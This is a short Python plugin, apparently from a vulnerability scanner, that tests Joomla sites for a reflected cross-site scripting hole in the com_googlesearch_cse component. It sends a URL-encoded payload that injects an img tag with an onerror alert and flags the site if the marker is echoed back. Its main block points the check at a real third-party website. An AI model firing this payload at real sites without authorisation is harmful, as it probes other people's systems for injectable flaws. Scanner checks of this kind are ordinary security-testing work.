#!/usr/bin/env python
#-*- encoding:utf-8 -*-

import re

def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payload = "index.php?option=com_googlesearch_cse&n=30&Itemid=&cx=017093687396734519753%3Ao_92rwvgxxw&cof=FORID%3A9&ie=ISO-8859-1&q=%22%3E%3Cimg+src%3Dx+onerror%3Dalert('0x2334171512353333>')%3E&sa=Search&hl=en"
    url = arg + payload 
    code, head, res, errcode, _ = curl.curl(url )
    if code==200 and '0x2334171512353333>' in res:
        security_hole(url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.linuxcnc.org/')[1])